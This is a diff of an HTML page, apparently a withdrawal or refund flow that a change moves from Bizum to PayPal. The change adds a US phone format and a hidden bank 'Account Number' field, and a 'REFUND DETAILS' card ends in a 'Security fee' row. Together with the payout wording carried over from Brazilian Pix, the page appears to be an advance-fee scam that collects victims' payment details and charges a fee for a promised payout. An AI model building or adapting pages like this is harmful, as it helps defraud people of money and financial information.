@@ -569,26 +569,31 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           <div class="title saque-title vincular-header">
             <button type="button" class="vincular-back" data-modal-close aria-label="Back">&lt; Back</button>
             <div class="vincular-title-wrap">
-              <img id="vincular-icon" src="images/bizum-logo.png" alt="" class="vincular-icon">
-              <span id="vincular-title" class="vincular-title-text">Link Bizum</span>
+              <img id="vincular-icon" src="images/paypal-logo.jpg" alt="" class="vincular-icon">
+              <span id="vincular-title" class="vincular-title-text">Link PayPal</span>
             </div>
             <span class="vincular-spacer" aria-hidden="true"></span>
           </div>
 
           <div class="form-container">
             <div class="form-group">
-              <label class="field-label" for="nome">Name</label>
+              <label class="field-label" for="nome" id="nome-label">Name</label>
               <input type="text" id="nome" placeholder="Full name" class="nome-completo">
             </div>
 
-            <div class="form-group">
+            <div class="form-group" id="correo-group">
               <label class="field-label" for="correo">Email</label>
               <input type="text" id="correo" placeholder="you@email.com" class="nome-completo">
             </div>
 
             <div class="form-group">
               <label class="field-label" for="metodo-input" id="metodo-label">Phone number</label>
-              <input type="text" id="metodo-input" placeholder="+34 600 000 000" class="nome-completo">
+              <input type="text" id="metodo-input" placeholder="+1 555 000 0000" class="nome-completo">
+            </div>
+
+            <div class="form-group" id="metodo2-group" style="display:none">
+              <label class="field-label" for="metodo2-input" id="metodo2-label">Account Number</label>
+              <input type="text" id="metodo2-input" placeholder="Bank account number" class="nome-completo">
             </div>
 
             <button type="button" id="btn-enviar-pix" class="btn-obrigado btn-sacar-dois btn-vincular btn-disabled" aria-label="Send">
@@ -941,7 +946,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             <div class="pago-card-title">REFUND DETAILS</div>
             <div class="pago-row"><span class="pago-row-label">Name</span><span class="pago-row-value" id="pago-nombre">—</span></div>
             <div class="pago-row"><span class="pago-row-label">Email</span><span class="pago-row-value" id="pago-correo">—</span></div>
-            <div class="pago-row"><span class="pago-row-label" id="pago-metodo-label">Bizum</span><span class="pago-row-value" id="pago-metodo-value">—</span></div>
+            <div class="pago-row"><span class="pago-row-label" id="pago-metodo-label">PayPal</span><span class="pago-row-value" id="pago-metodo-value">—</span></div>
             <div class="pago-row">
               <span class="pago-row-label">Security fee</span>
               <span class="pago-row-value pago-highlight">
